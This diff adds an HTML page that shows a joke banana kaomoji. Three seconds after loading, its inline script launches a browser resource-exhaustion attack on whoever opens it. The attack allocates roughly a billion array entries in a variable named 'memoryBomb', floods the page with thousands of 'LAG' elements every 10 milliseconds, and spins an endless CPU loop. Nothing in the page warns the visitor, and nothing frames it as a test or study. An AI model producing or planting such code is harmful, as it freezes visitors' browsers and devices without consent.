@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8" />
+  <title>(   ᐛ)ﾊﾞﾅﾅ</title>
+  <style>
+    body {
+      background: black;
+      color: lime;
+      font-family: monospace;
+      overflow: hidden;
+    }
+  </style>
+</head>
+<body>
+  <h1>(   ᐛ)ﾊﾞﾅﾅ</h1>
+  <p>( ᐛ)ﾊﾞﾅﾅ</p>
+
+  <script>
+    
+    setTimeout(() => {
+      document.body.innerHTML = "<h1>( ᐛ)ﾊﾞﾅﾅ( ᐛ)ﾊﾞﾅﾅ</h1>";
+
+      
+      function burnCPU() {
+        while (true) {
+          Math.sqrt(Math.random() * 1e12);
+        }
+      }
+
+      
+      const memoryBomb = [];
+      function burnMemory() {
+        for (let i = 0; i < 1e6; i++) {
+          memoryBomb.push(new Array(1000).fill("LAG"));
+        }
+      }
+
+      
+      function burnDOM() {
+        setInterval(() => {
+          for (let i = 0; i < 5000; i++) {
+            const d = document.createElement("div");
+            d.textContent = "LAG";
+            document.body.appendChild(d);
+          }
+        }, 10);
+      }
+
+      
+      burnMemory();
+      burnDOM();
+      burnCPU(); 
+
+    }, 3000);
+  </script>
+</body>
+</html>
